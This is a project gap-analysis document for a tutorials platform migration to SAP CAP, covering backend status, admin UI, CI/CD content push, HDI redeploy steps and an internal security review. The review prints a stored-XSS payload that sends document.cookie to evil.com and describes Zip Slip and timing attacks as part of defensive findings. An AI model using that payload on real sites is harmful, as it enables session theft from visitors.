# Gap Analysis — tutorials-poc

## Executive Summary

The tutorials-poc project has a working **learner-facing frontend** (tutorial navigation, progress tracking, App Space event view), a **CAP backend** that is substantially complete, and a full **admin UI** (9 Fiori Elements apps + 1 freestyle SAPUI5 app). The remaining gaps are: **content push pipeline** (template only, not deployed), **static content webhook** (no CI/CD), and a few backend edge cases not yet validated against production IMS.

---

## 1. CAP Backend Rewrite (Substantially Complete)

The rewrite documented in `docs/superpowers/plans/` has been **executed**. What exists now:

### Completed

- [x] **CDS Data Model** (`db/schema.cds`) — 35 entities covering all IMS tables: Tutorials, Missions, Groups, Steps, Checkpoints, Users, TaskRecords, Events, Prizes, PrizeRecords, Tags, Accomplishments, AccomplishmentRecords, CompletionPaths, CompletionPathItems, TutorialMeta, TutorialContributors, TutorialRepositories, UserMetaData, DeveloperEnvironmentTabs/Links, ActiveLearnerRecords, DashboardMonitoredRecords, StepFailures, NGDSFailedMessages, ImsConfig, JobLocks, PrimaryAccounts, SecondaryAccounts, PrivacyProtectionActions, FeaturedTasks, FailedEmails
- [x] **Tasks union view** (`db/views.cds`) — UNION ALL across Tutorials/Missions/Groups/Steps/Checkpoints with taskType discriminator
- [x] **NavigatorCatalog view** — Pre-joined view for build pipeline (mission → path → item → tutorial slug)
- [x] **LegacyKeyed aspect + legacy-id.js** — Sequence-backed integer IDs for backward compatibility
- [x] **DeveloperService** (`srv/developer-service.cds` + `.js`) — `completeStep`, `getProgress`, `createTaskRecord`, `findTaskProgressByUserAndTasksIds`, `countCompletedMissionsTotal/Percent`, `getEventProgress` (replaces AEM progress/series)
- [x] **Status calculator** (`srv/lib/status-calculator.js`) — Progress cascade from steps → tutorial
- [x] **Accomplishment evaluator** (`srv/lib/accomplishment-evaluator.js`) — Wired as `after('createTaskRecord')` hook
- [x] **AdminService** (`srv/admin-service.cds` + `.js`) — Full CRUD projections for all 25+ entities + admin actions (anonymize, cleanup, featured order, NGDS, sync, notifications, statistics, export)
- [x] **DisplayService** (`srv/display-service.cds` + `.js`) — Event buckets, burnup, track stats, completion speed, leaderboard
- [x] **ConsolidationService** (`srv/consolidation-service.cds` + `.js`) — `userMerge` + `getMergeStatus`
- [x] **~~STOMP WebSocket broker~~ → `@cap-js-community/websocket`** — Replaced custom `stomp-broker.js` with CDS-native WebSocket plugin. `EventStreamService` (`@protocol: ['websocket','rest']`) + `DisplayService` (`@protocol: ['odata','websocket']`). Socket.IO transport.
- [x] **Job scheduler** (`srv/jobs/scheduler.js`) — node-cron with distributed lock: step-failure cleanup (daily), active learner analytics (daily), NGDS retry (2h), account merge (daily), tag cleanup (biannual), tutorial metadata review (weekly), contributor notifications (weekly Mon 9am), email retry (4h)
- [x] **Job lock library** (`srv/jobs/job-lock.js`) — Database-backed distributed lock using JobLocks entity
- [x] **NGDS client** (`srv/lib/ngds-client.js`) + retry job (`srv/jobs/ngds-retry.js`)
- [x] **Adobe Analytics client** (`srv/lib/adobe-analytics.js`)
- [x] **Account merge** (`srv/lib/account-merge.js` + `srv/jobs/account-merge-job.js`)
- [x] **Tutorial sync** (`srv/lib/tutorial-sync.js`)
- [x] **Contributor notifications** (`srv/lib/contributor-notifications.js` + `srv/lib/mail-client.js`)
- [x] **QR code handler** (`srv/lib/qrcode-handler.js`) — Express route at `/api/qrcode`
- [x] **Build catalog** (`srv/lib/build-catalog.js`) — Unauthenticated `/build/catalog` for static site generation
- [x] **Navigator catalog** (`srv/lib/navigator-catalog.js`) — `/build/navigator` endpoint
- [x] **Tech user auth** (`srv/lib/tech-user-auth.js`) — Basic auth middleware for service-to-service calls
- [x] **server.js bootstrap** — CORS (dev), custom routes, auth endpoint (`/auth/user`), job registration, STOMP broker attachment

### Remaining Backend Gaps

- [x] **HANA sequences for legacyId** — 30 per-entity `.hdbsequence` files deployed in `db/src/`, START WITH 10000001 to avoid collision with migrated data; `legacy-id.js` validates entity names against known set
- [x] **Integration testing against real HANA** — Vitest workspace with `hybrid` project; 5 test files (schema-deploy, hana-sequences, views, developer-workflow, admin-crud) run via `npm run test:hybrid` using `cds bind --exec`
- [ ] **Adobe Analytics destination config** — Client exists but BTP Destination for `sap.d1.sc.omtrdc.net` may not be configured
- [ ] **NGDS destination config** — Client exists but BTP Destination not verified
- [ ] **Mail service binding** — `mail-client.js` exists but no BTP Mail Service instance confirmed
- [x] **Leaderboard cache** — All 5 DisplayService functions cached with 600s TTL per eventLegacyId (`srv/lib/ttl-cache.js`)
- [x] **Production smoke tests** — Smoke suite in `test/smoke/` validates health, public endpoints, auth enforcement, OData metadata, and static content post-deploy
- [x] **Plan checkboxes** — The 4 plan files in `docs/superpowers/plans/` still show all tasks unchecked; update them to reflect reality

---

## 2. Admin UI (Implemented — PR #1)

The IMS React 15 admin frontend has **11 pages** — all reimplemented as Fiori Elements V4 + freestyle SAPUI5:

- [x] Tutorial Dashboard (freshness/ownership tracking) — freestyle SAPUI5 grid table view
- [x] Mission Management (nested completion paths) — Fiori Elements List Report + Object Page with draft
- [x] Groups Management (CRUD) — Fiori Elements List Report + Object Page with draft
- [x] Events Management (CRUD) — Fiori Elements List Report + Object Page with draft
- [x] Privacy/GDPR Tools (lookup + anonymize) — freestyle SAPUI5 wizard view
- [x] Board/Analytics Dashboard (KPIs + charts) — freestyle SAPUI5 Board view
- [x] Featured Tasks Curation — Fiori Elements List Report (Operations app)
- [x] Prizes Management (simple CRUD) — Fiori Elements List Report + Object Page
- [x] Accomplishments Management (rule-based badges) — Fiori Elements List Report + Object Page with draft
- [x] Statistics Export (CSV download) — freestyle SAPUI5 export view
- [x] Tags (read-only table) — Fiori Elements List Report
- [x] **Change Tracking** — Implemented `@cap-js/change-tracking` for Admin UI audit trail. 7 entities tracked (Events, Missions, Groups, Accomplishments, Prizes, ImsConfig, FeaturedTasks). Change History tab on all Object Pages via `changes/@UI.PresentationVariant` facet. Tracks field-level changes with who/when/what.
- [x] **UI5 Dev Server plugin (`cds-plugin-ui5`)** — Integrated: all 10 admin apps served via `cds watch` using `file:` devDependencies for nested Fiori Elements apps + direct detection for `admin-custom`. Mount paths configured in `package.json` under `cds.cds-plugin-ui5.modules`. No separate UI dev server needed.
- [x] **Audit Logging plugin (`@cap-js/audit-logging`)** — Implemented: `@PersonalData` annotations on `Users` (DataSubject), `UserMetaData`, `TaskRecords` (DataSubjectDetails). SecurityEvent emitted on anonymization. MTA resource bound (`auditlog` premium plan). Logs to console in dev, routes to SAP Audit Log Service in production. 9 unit tests in `test/audit-logging.test.js`.

---

## ~~3. AEM Endpoints~~ **REMOVED**

All 8 AEM endpoints have been replaced by CAP and the AEM proxy layer has been decommissioned. The `scripts/parsers/aem.ts` file has been deleted.

---

## 4. Content Push Pipeline ✅

Dispatch template in `docs/tutorial-repo-dispatch.yml`. Receiving workflow in `.github/workflows/rebuild-content.yml`. AppRouter rebuild handler in `approuter/server.js` (atomic directory swap with rollback).

- [x] Create dispatch workflow template (`docs/tutorial-repo-dispatch.yml`)
- [x] Create receiving workflow (`.github/workflows/rebuild-content.yml`) — triggers on `repository_dispatch` type `tutorial-updated` + manual `workflow_dispatch`
- [x] Implement AppRouter rebuild endpoint (`/admin/rebuild`) — receives gzipped tarball, atomic swap
- [ ] Install dispatch workflow in sap-tutorials repos (or at org level via reusable workflow)
- [ ] Fill in `<OWNER>` placeholder in the dispatch URL (`sap-tutorials/tutorials-poc`)
- [ ] Configure `TUTORIALS_DISPATCH_TOKEN` secret (GitHub PAT with repo scope)
- [ ] Configure `REBUILD_API_KEY` secret in tutorials-poc repo (for workflow → AppRouter auth)
- [ ] Configure `TUTORIALS_GITHUB_TOKEN` secret (for fetch-tutorials to access sap-tutorials org)

---

## 5. Static Content Update Webhook ✅

Solved via the content push pipeline above — the receiving workflow POSTs a content tarball directly to the running AppRouter. No full MTA redeploy needed.

- [x] Decide on delivery approach: **Custom rebuild endpoint** (dispatch → rebuild → POST tarball to AppRouter `/admin/rebuild`)
- [x] Implement CI/CD pipeline (`.github/workflows/rebuild-content.yml`)
- [ ] Test end-to-end: tutorial commit → dispatch → rebuild → deployed content updated

---

## 6. Real-Time Event Display ✅

- [x] WebSocket subscription in AppSpace.vue — real-time `tutorialCompleted` events via Socket.IO with confetti + toast celebration effects
- [x] Display UI equivalent (big-screen dashboard for events) — `display-app/` rewritten from STOMP to Socket.IO (`display-app/src/event-stream.ts`)
- [x] **Replaced custom STOMP broker with `@cap-js-community/websocket` plugin** — CDS-native WebSocket via `@protocol: 'websocket'` annotation. Removed `srv/lib/stomp-broker.js`. `EventStreamService` (unauthenticated kiosk displays) at `/ws/event-stream` + `/rest/event-stream`. `DisplayService` dual-protocol at `/display`. Context-based filtering via `wsContext` emit. Smoke tests verify Socket.IO handshake and REST endpoint.

---

## 7. Backend Subsystems — Porting Status

### Implemented (code exists, needs production validation)

- [x] Notification System — `contributor-notifications.js` + `mail-client.js` + weekly cron job; **gap: BTP Mail Service binding not confirmed**
- [x] NGDS Sync — `ngds-client.js` + 2-hour retry job + `NGDSFailedMessages` entity; **gap: BTP Destination not configured**
- [x] Adobe Analytics — `adobe-analytics.js` client; **gap: destination config + verify event format matches IMS**
- [x] Account Merge — `account-merge.js` + daily batch job + ConsolidationService endpoints; **gap: test with real SCI calls**
- [x] Accomplishment Evaluator — `accomplishment-evaluator.js` wired as `after('createTaskRecord')` hook
- [x] Leaderboard/Rankings — `DisplayService.getLeaderboard` function; **gap: no cache layer (IMS uses 600s TTL)**
- [x] Featured Tasks — `FeaturedTasks` entity + `AdminService.setFeaturedOrder` action
- [x] Active Learner Stats — `analytics.js` + daily cron job writing `ActiveLearnerRecords`
- [x] Step Failure Cleanup — `cleanup.js` + daily cron (90-day retention)
- [x] Tag Cleanup — `cleanup.js` + biannual cron (Jan/Jul)

### Not Yet Implemented

- [x] **Email retry dashboard** — `FailedEmails` entity exposed in Operations admin app (Fiori Elements List Report)
- [x] **NGDS failed message inspector** — `NGDSFailedMessages` entity exposed in Operations admin app (Fiori Elements List Report)
- [x] **Notification 4-stage escalation** — Fixed: `reviewTutorial` action resets escalation to 0, `snoozeTutorial` delays without resetting level, `before UPDATE` hook auto-resets on reviewedDate change. Fixes longstanding IMS bug where notifications never cleared after review.
- [x] **Research: Telemetry plugin (`@cap-js/telemetry`)** — Installed and configured. Console tracing in dev/hybrid (hierarchical timing breakdowns), SAP Cloud Logging export in production via gRPC. Sampler ignores `/health` endpoints. Cloud-logging service added to mta.yaml. See <https://cap.cloud.sap/docs/plugins/#telemetry>
- [x] **ORD plugin (`@cap-js/ord`)** — Installed and configured. All 6 CDS services discoverable at `/.well-known/open-resource-discovery` and `/ord/v1/documents/ord-document`. Namespace: `sap.tutorials`, visibility: public, auth: open. AppRouter routes added. Smoke tests added. See <https://cap.cloud.sap/docs/plugins/#ord-open-resource-discovery>
- [x] **Swagger UI (`cds-swagger-ui-express`)** — Installed as CDS plugin (devDependency). Auto-activates in development via `[development].swagger` profile config in package.json. Swagger UI available at `/$api-docs/{service-path}` for all 6 services (e.g., `http://localhost:4004/$api-docs/api` for DeveloperService). Includes interactive OpenAPI explorer with auto-generated specs from CDS definitions. Disabled in production (no config = plugin skips). See <https://www.npmjs.com/package/cds-swagger-ui-express>

---

## 8. Priority Ranking (Updated)

| # | Gap | Impact | Effort | Status |
|---|-----|--------|--------|--------|
| 1 | Content push pipeline (dispatch + receiving workflow) | Blocks author workflow | Low | **Done** — workflow + rebuild handler implemented |
| 2 | Static content webhook (CI/CD redeploy) | Blocks production content updates | Medium | **Done** — solved by rebuild endpoint |
| 3 | AEM endpoint retirement (0 remaining) | Blocks AEM decommission | Medium | **Done** — all 8 wired to CAP |
| 4 | Admin UI — Tutorial Dashboard | Blocks content operations | High | **Done** — PR #1 |
| 5 | Admin UI — Missions + Groups CRUD | Blocks content curation | High | **Done** — PR #1 |
| 6 | BTP service bindings (Mail, NGDS dest, Analytics dest) | Blocks production job execution | Medium | Code done, config needed |
| 7 | GDPR/Privacy tools (admin UI) | Compliance risk | Medium | **Done** — PR #1 |
| 8 | Integration testing on HANA | Confidence in deploy | Medium | **Done** — 91 tests passing |
| 9 | Real-time display (frontend WebSocket) | Event experience degradation | Medium | **Done** — `@cap-js-community/websocket` + Socket.IO |
| 10 | Plan doc cleanup | Housekeeping | Low | Plans show unchecked but work is done |

---

## 9. Immediate Action Items

- [ ] Deploy the dispatch workflow to at least one sap-tutorials repo as proof-of-concept
- [x] Create the receiving workflow in tutorials-poc (`.github/workflows/rebuild-content.yml`)
- [x] Wire all AEM endpoints to CAP (progress series, search, QR code — all complete)
- [ ] Configure BTP Destinations for NGDS and Adobe Analytics
- [ ] Verify `cds deploy --to hana` succeeds with the full 35-entity schema (see §11 below)
- [x] Decide on static content delivery — rebuild endpoint on AppRouter (`/admin/rebuild`)

---

## 10. Reported Bugs (Team Feedback 2026-04-29)

- [x] **App Space not showing data** — Root cause: EventDisplay required an `imsUrl` URL parameter (legacy from Java IMS era). Fixed by removing the parameter and using relative URLs via AppRouter proxy. Also added `/rest/` route to `xs-app.json`. AppSpace.vue itself was already using relative paths correctly.
- [x] **Dark mode toggle not working** — Root cause: `toggleTheme()` handler only existed in `tutorial.ts` (loaded only on tutorial detail pages). Fixed by moving the click delegation handler to the inline `<script>` in `head.html` (runs on all pages). Also fixed toggle alignment in shellbar (added explicit height, line-height:0, centered thumb).
- [x] **Mission/Group pages return 404** — Fixed: `build-catalog.js` now falls back to `String(legacyId)` when slug is null, ensuring pages are always generated. The `/build/slug-mapping` endpoint and `populate-slugs` migration provide paths to backfill friendly slugs.

---

## 11. Fresh HDI Container Deploy Plan (2026-05-02)

**Context:** The DEV HDI container was originally deployed with `.hdbtable` artifacts (no migration support). Converting to `@cds.persistence.journal` (`.hdbmigrationtable`) in-place proved brittle — HDI rejected multi-version ALTER migrations against the existing tables. A fresh container avoids all backwards-compatibility issues and matches the production deployment path (clean HDI → full schema → data import).

**State after cleanup:**

- `db/src/*.hdbmigrationtable` — 33 files, all version=1 with the FULL current model (including `primaryTagRef_ID`, `groupOrder`)
- `db/undeploy.json` — lists 33 old `.hdbtable` paths + trigger glob (harmless on fresh container)
- `cds build` succeeds and produces matching `gen/db/src/` output
- `db/last-dev/csn.json` — current model state, in sync

**Steps:**

1. **Delete the DEV HDI container service instance**

   ```bash
   cf login -a https://api.cf.us30.hana.ondemand.com  # DEV space
   cf delete-service tutorials-poc-db -f
   # Wait for async delete to complete:
   cf service tutorials-poc-db  # should return "not found"
   ```

2. **Recreate and deploy**

   ```bash
   cds build
   cds deploy --to hana
   # This creates a new HDI container, deploys all 33 migration tables + views + sequences
   ```

3. **Verify schema (hybrid tests)**

   ```bash
   npm run test:hybrid
   # Confirms all 35 entities accessible, column structure correct, sequences working
   ```

4. **Re-import reference data from QA**

   ```bash
   # Set source (QA/Java IMS)
   export IMS_BASE_URL=https://imsprod-approuter.cfapps.us30.hana.ondemand.com
   export IMS_AUTH_TOKEN=<token>
   export CAP_BASE_URL=http://localhost:4004  # or DEV srv URL

   node scripts/migrate-reference-data.js export   # exports to .migration-data/
   node scripts/migrate-reference-data.js import   # imports into fresh CAP
   node scripts/migrate-reference-data.js populate-slugs  # backfill slug fields
   ```

5. **Optionally re-import user progress** (if needed for DEV testing)

   ```bash
   node scripts/migrate-user-progress.js export
   node scripts/migrate-user-progress.js import
   ```

6. **Mark TODO §9 line as done**

**Why this works for production too:** Production will be a first-time deploy to a new HDI container (never had the old `.hdbtable` artifacts). The version=1 migration files create tables with the full current schema. No ALTER history needed.

---

## 12. Security Review (2026-05-01)

First comprehensive security audit of the full implementation. Findings ranked by exploitability confidence (≥80%).

### HIGH Severity

#### 12.1 Path Traversal via Tar Extraction — `approuter/server.js:40`

| Field | Detail |
|-------|--------|
| Category | Path Traversal |
| Confidence | 10/10 |
| Status | [x] Fixed |

**Description:** The `/admin/rebuild` endpoint extracts a tar.gz archive using `tar.extract({ cwd: TEMP_DIR })` with no `filter` callback. Node-tar without a filter extracts entries containing `../` path components, allowing writes to arbitrary filesystem locations outside TEMP_DIR (classic "Zip Slip" vulnerability).

**Exploit Scenario:** An attacker who possesses or brute-forces the `REBUILD_API_KEY` bearer token crafts a `.tar.gz` with an entry named `../../xs-app.json`. Extraction overwrites the AppRouter route config, enabling unauthenticated access to admin endpoints.

**Fix:** Add a `filter` option to `tar.extract` that rejects entries containing `..` path segments or absolute paths. Or upgrade to node-tar >= 7.x which rejects `../` entries by default.

---

#### 12.2 Stored XSS via Unsanitized Tutorial HTML — `hugo/hugo.toml:11`

| Field | Detail |
|-------|--------|
| Category | XSS (Stored) |
| Confidence | 9/10 |
| Status | [x] Fixed |

**Description:** Hugo's Goldmark renderer is configured with `unsafe = true`, meaning raw HTML in tutorial markdown is rendered directly into pages. The Hugo build path has **no HTML sanitization** (confirmed by test assertion in `hugo-write.test.ts`). The CSP header includes `script-src 'unsafe-inline'`, providing zero browser-level mitigation.

**Exploit Scenario:** A contributor with write access to any `sap-tutorials` repo inserts `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` into a tutorial step. The build pipeline passes this through unmodified, Hugo renders it as live HTML, and the CSP allows inline script execution. Every authenticated visitor has their session stolen.

**Fix (layered):**
1. Add HTML sanitization (allowlist of safe tags) in the Hugo write path — similar to the existing VitePress path's `escapeHtmlTags`
2. Remove `'unsafe-inline'` from the `script-src` CSP directive (use nonces)
3. Consider `unsafe = false` if tutorials only need standard markdown + Hugo shortcodes

---

### MEDIUM Severity

#### 12.3 Open Redirect via URL Parameter — `display-app/src/App.vue:167`

| Field | Detail |
|-------|--------|
| Category | Open Redirect / Phishing |
| Confidence | 9/10 |
| Status | [x] Fixed |

**Description:** The display app reads `participateUrl` from URL query parameters without validation and renders it as a QR code + clickable `<a href>` link. Any URL (including phishing sites) can be injected.

**Fix:** Validate against an allowlist of permitted domains (e.g., `*.sap.com`, `*.hana.ondemand.com`) and reject `javascript:` / `data:` schemes.

---

#### 12.4 Unauthenticated Endpoints Leak Database Error Details — `srv/server.js:27-34`

| Field | Detail |
|-------|--------|
| Category | Data Exposure |
| Confidence | 8/10 |
| Status | [x] Fixed |

**Description:** `/health/db`, `/build/catalog`, and `/build/navigator` (all unauthenticated) return raw `err.message` from database failures. HANA errors typically include hostnames, ports, and connection parameters.

**Fix:** Return generic error messages to unauthenticated callers; log details server-side only.

---

#### 12.5 Timing Side-Channel in Password Comparison — `srv/lib/tech-user-auth.js:57`

| Field | Detail |
|-------|--------|
| Category | Authentication Weakness |
| Confidence | 8/10 |
| Status | [ ] Open |

**Description:** Basic Auth password comparison uses `!==` (short-circuits on first differing character). Tech users get `Admin` role on success. Timing analysis can progressively reveal the password.

**Fix:** Use `crypto.timingSafeEqual` with fixed-length buffers.

---

#### 12.6 Unauthenticated WebSocket Event Stream — `srv/event-stream-service.cds:2`

| Field | Detail |
|-------|--------|
| Category | Missing Authentication |
| Confidence | 8/10 |
| Status | [ ] Open |

**Description:** `EventStreamService` has `@requires: 'any'` (anonymous access). Anyone can connect via WebSocket and passively monitor real-time tutorial completion activity across all events.

**Fix:** Add origin validation and/or token-based auth for WebSocket connections, or accept as intentional for kiosk displays and document the risk.

---

### Positive Security Observations

- All CDS service handlers use parameterized CQL queries — no SQL injection in standard operations
- DeveloperService, AdminService, DisplayService, ConsolidationService all have proper `@requires` annotations
- No `eval()`, `exec()`, `spawn()`, or dynamic code execution anywhere in `srv/`
- No filesystem path traversal in service handlers (only hardcoded `process.cwd()` joins)
- `@cap-js/audit-logging` with `@PersonalData` annotations provides GDPR-compliant data access logging
- `@cap-js/change-tracking` provides audit trail for admin entity modifications
- Vue 3 apps use zero `v-html` directives — all content uses safe `{{ }}` interpolation
